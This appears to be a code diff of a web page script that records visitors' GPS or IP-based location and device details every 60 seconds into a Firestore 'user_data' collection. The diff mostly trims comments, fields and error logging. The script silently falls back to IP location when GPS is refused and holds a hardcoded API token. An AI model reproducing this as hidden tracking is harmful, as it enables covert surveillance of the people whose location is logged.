@@ -27,18 +27,18 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // ✅ Register Service Worker (Ensuring Proper Registration)
+        // ✅ Register Service Worker
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('/sw.js')
                 .then(() => console.log("✅ Service Worker Registered"))
                 .catch(err => console.error("❌ SW Registration Failed:", err));
         }
 
-        // ✅ Function to Get IST Timestamp
+        // ✅ Get IST Timestamp
         function getISTTime() {
             let now = new Date();
-            let utcTime = now.getTime() + now.getTimezoneOffset() * 60000; // Convert to UTC
-            let istTime = new Date(utcTime + (5.5 * 60 * 60 * 1000)); // Convert to IST
+            let utcTime = now.getTime() + now.getTimezoneOffset() * 60000;
+            let istTime = new Date(utcTime + (5.5 * 60 * 60 * 1000));
             return istTime.toISOString().replace("T", " ").substring(0, 19);
         }
 
@@ -55,13 +55,11 @@
                 colorDepth: screen.colorDepth,
                 pixelRatio: window.devicePixelRatio,
                 onlineStatus: navigator.onLine,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer,
-                pageURL: window.location.href
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
         }
 
-        // ✅ Function to Get GPS Location
+        // ✅ Get GPS Location
         function getGPSLocation(callback) {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
@@ -75,19 +73,15 @@
                             device: getDeviceInfo()
                         });
                     },
-                    (error) => {
-                        console.warn("❌ GPS Denied, Using IP Location Instead.");
-                        callback(null);
-                    },
+                    () => callback(null),
                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             } else {
-                console.warn("❌ GPS Not Supported.");
                 callback(null);
             }
         }
 
-        // ✅ Function to Get IP Location
+        // ✅ Get IP Location
         function getIPLocation(callback) {
             fetch('https://ipinfo.io/json?token=6a9008bb55fd89')
                 .then(response => response.json())
@@ -99,21 +93,15 @@
                         country: data.country,
                         latitude: data.loc.split(",")[0],
                         longitude: data.loc.split(",")[1],
-                        org: data.org,
-                        postal: data.postal,
-                        timezone: data.timezone,
                         timestamp: getISTTime(),
                         type: "IP",
                         device: getDeviceInfo()
                     });
                 })
-                .catch(error => {
-                    console.error("❌ Error Fetching IP Location:", error);
-                    callback(null);
-                });
+                .catch(() => callback(null));
         }
 
-        // ✅ Save Data to Firestore
+        // ✅ Save to Firestore
         async function saveToFirestore(data) {
             try {
                 await addDoc(collection(db, "user_data"), data);
@@ -121,12 +109,12 @@
             } catch (error) {
                 console.error("❌ Error Saving Data:", error);
                 navigator.serviceWorker.ready.then(reg => {
-                    reg.sync.register('sync-location'); // Register Background Sync
+                    reg.sync.register('sync-location');
                 });
             }
         }
 
-        // ✅ Function to Collect and Send Location
+        // ✅ Collect Location
         function collectLocation() {
             getGPSLocation((gpsData) => {
                 if (gpsData) {
@@ -142,14 +130,7 @@
         // ✅ Send Data Every 60 Seconds
         setInterval(collectLocation, 60000);
 
-        // ✅ Send Cached Data When Online
-        window.addEventListener("online", () => {
-            navigator.serviceWorker.ready.then(reg => {
-                reg.sync.register('sync-location');
-            });
-        });
-
-        // ✅ Send Location When Page is Opened
+        // ✅ Send Data When Page Opens
         collectLocation();
     </script>
 </body>
